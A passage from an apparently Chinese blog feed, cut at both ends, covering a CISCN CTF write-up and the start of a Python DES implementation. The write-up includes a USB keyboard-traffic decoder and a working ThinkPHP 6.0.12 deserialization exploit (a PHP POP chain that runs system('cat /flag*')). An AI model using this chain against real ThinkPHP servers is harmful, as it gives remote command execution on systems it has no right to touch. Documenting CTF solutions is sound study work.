punctuation">:</span><span class="token string">"&lt;RET>"</span><span class="token punctuation">,</span><span class="token string">"29"</span><span class="token punctuation">:</span><span class="token string">"&lt;ESC>"</span><span class="token punctuation">,</span><span class="token string">"2a"</span><span class="token punctuation">:</span><span class="token string">"&lt;DEL>"</span><span class="token punctuation">,</span> <span class="token string">"2b"</span><span class="token punctuation">:</span><span class="token string">"\t"</span><span class="token punctuation">,</span><span class="token string">"2c"</span><span class="token punctuation">:</span><span class="token string">"&lt;SPACE>"</span><span class="token punctuation">,</span><span class="token string">"2d"</span><span class="token punctuation">:</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"2e"</span><span class="token punctuation">:</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"2f"</span><span class="token punctuation">:</span><span class="token string">"&#123;"</span><span class="token punctuation">,</span><span class="token string">"30"</span><span class="token punctuation">:</span><span class="token string">"&#125;"</span><span class="token punctuation">,</span><span class="token string">"31"</span><span class="token punctuation">:</span><span class="token string">"|"</span><span class="token punctuation">,</span><span class="token string">"32"</span><span class="token punctuation">:</span><span class="token string">"&lt;NON>"</span><span class="token punctuation">,</span><span class="token string">"33"</span><span class="token punctuation">:</span><span class="token string">"\""</span><span class="token punctuation">,</span><span class="token string">"34"</span><span class="token punctuation">:</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"35"</span><span class="token punctuation">:</span><span class="token string">"&lt;GA>"</span><span class="token punctuation">,</span><span class="token string">"36"</span><span class="token punctuation">:</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span><span class="token string">"37"</span><span class="token punctuation">:</span><span class="token string">">"</span><span class="token punctuation">,</span><span class="token string">"38"</span><span class="token punctuation">:</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">"39"</span><span class="token punctuation">:</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">,</span><span class="token string">"3a"</span><span class="token punctuation">:</span><span class="token string">"&lt;F1>"</span><span class="token punctuation">,</span><span class="token string">"3b"</span><span class="token punctuation">:</span><span class="token string">"&lt;F2>"</span><span class="token punctuation">,</span> <span class="token string">"3c"</span><span class="token punctuation">:</span><span class="token string">"&lt;F3>"</span><span class="token punctuation">,</span><span class="token string">"3d"</span><span class="token punctuation">:</span><span class="token string">"&lt;F4>"</span><span class="token punctuation">,</span><span class="token string">"3e"</span><span class="token punctuation">:</span><span class="token string">"&lt;F5>"</span><span class="token punctuation">,</span><span class="token string">"3f"</span><span class="token punctuation">:</span><span class="token string">"&lt;F6>"</span><span class="token punctuation">,</span><span class="token string">"40"</span><span class="token punctuation">:</span><span class="token string">"&lt;F7>"</span><span class="token punctuation">,</span><span class="token string">"41"</span><span class="token punctuation">:</span><span class="token string">"&lt;F8>"</span><span class="token punctuation">,</span><span class="token string">"42"</span><span class="token punctuation">:</span><span class="token string">"&lt;F9>"</span><span class="token punctuation">,</span><span class="token string">"43"</span><span class="token punctuation">:</span><span class="token string">"&lt;F10>"</span><span class="token punctuation">,</span><span class="token string">"44"</span><span class="token punctuation">:</span><span class="token string">"&lt;F11>"</span><span class="token punctuation">,</span><span class="token string">"45"</span><span class="token punctuation">:</span><span class="token string">"&lt;F12>"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">out</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    keys<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>    output <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">and</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'2'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"00"</span><span class="token punctuation">:</span>                 <span class="token keyword">continue</span>            <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token keyword">in</span> normalKeys<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                output <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>normalKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>shiftKeys<span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'2'</span><span class="token punctuation">]</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                output <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'[unknown]'</span><span class="token punctuation">]</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>    keys<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        a<span class="token operator">=</span>output<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'&lt;DEL>'</span><span class="token punctuation">)</span>        <span class="token keyword">del</span> output<span class="token punctuation">[</span>a<span class="token punctuation">]</span>        <span class="token keyword">del</span> output<span class="token punctuation">[</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"&lt;CAP>"</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span><span class="token number">1</span>            output<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>                flag<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">if</span> flag<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>            output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>output<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'output :'</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">)</span>out<span class="token punctuation">(</span><span class="token string">"2.txt"</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后用Notepad++打开转ASCII保存，再用rar打开，输入密码即可拿到flag…..</p><p>但是当时我们做的时候，确实没想到这个是个压缩包，把信息提取出来了，看到了内容….没往压缩包上考虑</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h2><h4 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a><strong>Ezpop</strong></h4><ol><li>Thinkphp6.0.12LTS 反序列化漏洞<a href="https://www.jianshu.com/p/92018015ec5e">https://www.jianshu.com/p/92018015ec5e</a> </li><li>Exp.php </li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">&#123;</span>     <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span>         <span class="token keyword">private</span> <span class="token variable">$lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>         <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">private</span> <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>         <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>         <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">protected</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">protected</span> <span class="token variable">$jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'cat /flag*'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">&#123;</span>     <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>     <span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">&#123;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DES算法的python实现</title>
      <link href="/2022/04/09/DES%E7%AE%97%E6%B3%95%E7%9A%84python%E5%AE%9E%E7%8E%B0/"/>
      <url>/2022/04/09/DES%E7%AE%97%E6%B3%95%E7%9A%84python%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>先上代码吧：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">my_read</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span>row<span class="token punctuation">,</span>col<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 读取各种矩阵----参数为文件名和目标矩阵的行列数</span>    sz <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>col<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> s1<span class="token punctuation">:</span>        lists <span class="token operator">=</span> s1<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>            <span class="token comment"># 以 , 将字符串分开</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sz<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                sz<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>    <span class="token keyword">return</span> sz    <span class="token comment"># 返回一个该矩阵的二维数组</span><span class="token keyword">def</span> <span class="token function">ord_bin</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">:</span>    str1_hex <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> str1<span class="token punctuation">:</span>        str1_hex <span class="token operator">=</span> str1_hex <span class="token operator">+</span> <span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> str1_hex<span class="token keyword">def</span> <span class="token function">create_L0R0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#生成L0,R0</span>    mingwen<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    MW<span class="token operator">=</span><span class="token string">"abcdefgh"</span>    str1_hex<span class="token operator">=</span>ord_bin<span class="token punctuation">(</span>MW<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            mingwen<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>str1_hex<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>j<span class="token punctuation">]</span>    rep <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"IP.txt"</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment">#读取置换矩阵</span>    rep_mingwen <span class="token operator">=</span> replace<span class="token punctuation">(</span>mingwen<span class="token punctuation">,</span>rep<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment">#进行初始置换</span>    L0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    R0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#得到c0</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            x<span class="token punctuation">,</span>y <span class="token operator">=</span> get_xy<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rep<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span>            <span class="token comment">#检查坐标</span>            L0<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>rep_mingwen<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#得到d0</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            x<span class="token punctuation">,</span>y <span class="token operator">=</span> get_xy<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rep<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span>            <span class="token comment">#检查坐标</span>            R0<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>rep_mingwen<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>L0<span class="token punctuation">,</span>R0<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">get_xy</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>row<span class="token punctuation">,</span>col<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># n为要转化为坐标的数值</span>    <span class="token keyword">if</span> n <span class="token operator">%</span> col <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>n<span class="token operator">/</span>col<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1</span>        y <span class="token operator">=</span> col <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>n<span class="token operator">/</span>col<span class="token punctuation">)</span>        y <span class="token operator">=</span> n<span class="token operator">%</span>col <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">replace</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span>rep<span class="token punctuation">,</span>row<span class="token punctuation">,</span>col<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 定义一个置换函数，参数temp为要替换的矩阵，file为替换矩阵，row列，col行</span>    new_temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>col<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token comment"># 用来保存置换后的矩阵并作为返回值</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            x<span class="token punctuation">,</span>y <span class="token operator">=</span> get_xy<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rep<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>row<span class="token punctuation">,</span>col<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rep<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">8</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                new_temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">[</span>x<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span>                <span class="token comment"># print(temp[x-1][7],end = ' ')</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                new_temp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span>    <span class="token keyword">return</span> new_temp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">child_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 生成k1~k16的子密钥</span>    key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    KEY <span class="token operator">=</span> <span class="token string">"abcdefgh"</span>    str1_hex <span class="token operator">=</span> ord_bin<span class="token punctuation">(</span>KEY<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> str1_hex<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> j<span class="token punctuation">]</span>    <span class="token comment"># 读取64位key</span>    c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    d <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    k <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    c0<span class="token punctuation">,</span>d0 <span class="token 